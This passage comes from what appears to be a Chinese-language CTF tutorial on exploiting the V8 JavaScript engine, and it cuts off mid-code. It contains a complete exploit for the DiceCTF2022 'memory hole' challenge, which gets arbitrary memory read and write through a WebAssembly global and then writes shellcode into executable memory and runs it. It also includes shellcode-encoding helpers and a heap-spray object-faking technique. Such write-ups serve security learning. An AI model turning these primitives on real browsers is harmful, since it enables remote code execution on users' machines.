59&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;xor edx, edx;syscall&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov rdi,rsi&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;xor esi, esi&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;syscall&quot;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">imm1 = [convert(x) <span class="keyword">for</span> x <span class="keyword">in</span> imm1]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sd <span class="keyword">in</span> imm1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;u2d(&#x27;</span>+<span class="built_in">str</span>(sd)+<span class="string">&quot;n&quot;</span>+<span class="string">&quot;),&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
然后使用如下脚本将生成的 shellcode 转为 浮点数。 <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> x = [</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996577893625528n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930873897669623914n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930951416110253384n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930838247832250448n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996698557186154n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930925778240310600n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996421403378504n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996698562857288n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996079408918456n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996696683430216n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930959146880009544n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996700016363600n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996077656554424n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996696216752689n</span>),        </span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; x.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x[i] + <span class="string">&quot;,&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">get_shellcode</span>();</span><br></pre></td></tr></table></figure></div> ### 利用
WasmInstance 的全局变量</p>
<p>由于这种方法在较高版本中不能使用，这里以 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/sandbox_bypass/wasm_global" >DiceCTF2022
memory hole <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例进行介绍。 这个题目我查到的 commit 号为
<code>002e39e97a56a05dd200481ea04c74b8c0203acc</code> ，虽然没有 patch
成功，但是 patch 完的部分可以正常触发漏洞。</p>
<p>和上一个 demo
一样，这个题目也添加了一个修改数组长度的方法，因此可以像上一题一样实现
address of 和 fake object 利用原语以及堆内任意地址读写。然而 wasm 产生的
rwx 段不在这个 v8 堆内，因此我们需一个真正的任意地址写来在 rwx 段内写
shellcode 。</p>
<p>wasm 可以用来实现一些的功能，比如下面这个代码就可以实现对 wasm 定义的
global 的读写。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x06</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x7E</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x1B</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0x6E</span>, <span class="number">0x61</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x67</span></span><br><span class="line">])</span><br><span class="line"><span class="keyword">const</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123; <span class="attr">value</span>: <span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>: <span class="literal">true</span> &#125;, <span class="number">0n</span>);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code), &#123; <span class="attr">js</span>: &#123; <span class="variable language_">global</span> &#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> get_global = wasm_instance.<span class="property">exports</span>.<span class="property">get_global</span>;</span><br><span class="line"><span class="keyword">var</span> set_global = wasm_instance.<span class="property">exports</span>.<span class="property">set_global</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">set_global</span>(<span class="number">0x114514n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">get_global</span>());</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(wasm_instance);</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>
<p>这介绍一下 wasm code 的生成方法： 首先编写一个能实现相应的功能的 wat
代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="title function_ invoke__">module</span></span><br><span class="line">   (<span class="keyword">global</span> <span class="variable">$g</span> (import <span class="string">&quot;js&quot;</span> <span class="string">&quot;global&quot;</span>) (mut i64))</span><br><span class="line">   (<span class="title function_ invoke__">func</span> (export <span class="string">&quot;get_global&quot;</span>) (result i64) (<span class="keyword">global</span>.get <span class="variable">$g</span>))</span><br><span class="line">   (<span class="title function_ invoke__">func</span> (export <span class="string">&quot;set_global&quot;</span>) (param <span class="variable">$p</span> i64) (<span class="keyword">global</span>.set <span class="variable">$g</span> (local.get <span class="variable">$p</span>)))</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
<p>然后在<a class="link" 
 href="https://webassembly.github.io/wabt/demo/wat2wasm/" >这个网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>上转换为
wasm 并下载转换后的文件，下载的文件中的数据即为 wasm code 。</p>
<p>这里打印出 <code>wasm_instance</code> 发现其中的
<code>imported_mutable_globals</code> 是一个完整的指针并且指向指向
<code>global</code> 对应的内存的指针（<code>global</code>
的二级指针），因此可以通过堆内任意地址读写修改
<code>imported_mutable_globals</code> 指向一个 <code>DoubleArray</code>
从而实现任意地址读写。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d34817efdf7ab68e6c3a4130c1043439.png"
                     
alt="在这里插入图片描述" 
                > <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fb1b9744b7ceb4fef1d8f40eb43d5504.png"
                     
alt="在这里插入图片描述" 
                > 之后的操作可以参考 OOB 。exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">oob_array.<span class="title function_">setLength</span>(<span class="number">114514</span>);</span><br><span class="line"></span><br><span class="line">double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">12</span>]);</span><br><span class="line">object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">8</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">8</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">12</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    double_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(offset);</span><br><span class="line">    oob_array[<span class="number">12</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> double_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">17</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">17</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">17</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">17</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sandbox_base = <span class="title function_">read</span>(<span class="number">24n</span>) &amp; <span class="number">0xFFFFFFFF00000000n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] sandbox base: &quot;</span> + <span class="title function_">hex</span>(sandbox_base));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x06</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x7E</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x1B</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0x6E</span>, <span class="number">0x61</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x67</span></span><br><span class="line">])</span><br><span class="line"><span class="keyword">const</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123; <span class="attr">value</span>: <span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>: <span class="literal">true</span> &#125;, <span class="number">0n</span>);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code), &#123; <span class="attr">js</span>: &#123; <span class="variable language_">global</span> &#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> get_global = wasm_instance.<span class="property">exports</span>.<span class="property">get_global</span>;</span><br><span class="line"><span class="keyword">var</span> set_global = wasm_instance.<span class="property">exports</span>.<span class="property">set_global</span>;</span><br><span class="line"></span><br><span class="line">imported_mutable_globals = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> imported_mutable_globals_addr = sandbox_base + <span class="title function_">offset_of</span>(imported_mutable_globals) - <span class="number">0x9n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] imported_mutable_globals: &quot;</span> + <span class="title function_">hex</span>(imported_mutable_globals_addr));</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(wasm_instance) + <span class="number">0x50n</span>, imported_mutable_globals_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    imported_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">get_global</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    imported_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="title function_">set_global</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code2 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_instance2 = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code2));</span><br><span class="line"><span class="keyword">let</span> f = wasm_instance2.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(sandbox_base + <span class="title function_">offset_of</span>(wasm_instance2) - <span class="number">1n</span> + <span class="number">0x60n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>
<h1 id="堆喷伪造对象">堆喷伪造对象</h1>
<p><strong>指针压缩</strong>下的通用堆喷技术，效果为：获取一个低 4
字节固定的对象 ## v8 堆块管理结构 一般而言，V8 中的 Heap Object 都分配在
4GB 堆空间的 <code>rw-</code>
页面上。在堆块页面的起始部分，有一段空间是用来存储堆块的元信息的，在 V8
的堆结构中有 <code>0x2118</code>
字节（具体看版本）用来存储堆结构相关信息。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/31dc3078d810bc5d919b3b19e6e7c3b6.png"
                     
alt="在这里插入图片描述" 
                > 其中关键字段解释如下： -
<code>0x0000000000040000</code>：堆大小。 -
<code>0x00000be508042118</code>：堆的起始地址。 -
<code>0x00000be508080000</code>：堆指针，表示该堆已经被使用到哪了，即现在堆指针指向
0xbe508080000 。 - <code>0x000000000003dee8</code>： 已经被使用的 size
， 0x3dee8 + 0x2118 = 0x40000 。 -
<code>0x0000000000002118</code>：堆头大小。</p>
<p>如果这个时候，我申请一个 <code>0xf700</code>
大小的数组。如果开启指针压缩，一个地址4字节，那么就是需要
<code>0xf700 * 4 + 0x2118 = 0x3fd18</code>，再对齐一下，那么就是<code>0x40000</code>大小的堆。
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">a = <span class="title class_">Array</span>(<span class="number">0xf700</span>);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(a);</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e958497f36a9306636a16a77a970e684.png"
                     
alt="在这里插入图片描述" 
                > <code>elements</code> 字段地址为
<code>0x559081c0000+ 0x80000 + 0x2118 + 0x1 = 0x055908242119</code>
。在启动指针压缩时，在堆中储存的地址为 4
字节，而根据上述堆的特性，我们能<strong>确定低 2 字节为
<code>0x2119</code></strong> ，而<strong>一般情况下其高 2
字节也是不变的</strong>，所以这里其实 <strong>4
字节都已经确认的</strong>。</p>
<p>还有一个比较重要的点是，该 <code>FixedArray</code>
是一个大对象，其是不受 <code>gc</code>
影响的，所以这里的效果就是获取一个已经地址的内容可控的内存区域。 ##
任意地址对象伪造 如果存在任意地址对象伪造漏洞（<code>fake_object</code>
原语），则我们可以在一个大的 <code>DoubleArray</code> 中伪造一个
<code>DoubleArray</code> 然后实现 <code>offset_of</code>
，<code>arbitrary_offset_read</code>
，<code>arbitrary_offset_write</code> 原语。</p>
<p>首先我们先创建一个大的 <code>DoubleArray</code> 并在里面伪造一个
<code>DoubleArray</code> 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/83f25f19f6050681363a6e709af40184.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                >
这里需要注意的是：通过调试可知，我们只需要伪造 <code>map</code> 的前 16
字节即可。而 <code>map</code> 的前 16 字节基本是不变的。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> spray_array = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0xf700</span>).<span class="title function_">fill</span>(<span class="number">1.1</span>);</span><br><span class="line"><span class="keyword">let</span> spray_array_data_offset = <span class="number">0x00202141n</span> + <span class="number">7n</span>;  <span class="comment">// spray_array 的 element 中成员的起始地址</span></span><br><span class="line"><span class="keyword">let</span> map_offset = spray_array_data_offset + <span class="number">0x1000n</span>;  <span class="comment">// 伪造的 map 在沙箱中的偏移</span></span><br><span class="line"><span class="keyword">let</span> fake_double_array_offset = map_offset + <span class="number">0x1000n</span>;  <span class="comment">// 伪造的 fake_double_array 在沙箱中的偏移</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造 fake_double_array 的 map ，这里只需要伪造前 16 字节。</span></span><br><span class="line">spray_array[(map_offset - spray_array_data_offset) / <span class="number">8n</span>] = <span class="title function_">u2d</span>(<span class="number">0x1a04040400002141n</span>);</span><br><span class="line">spray_array[(map_offset 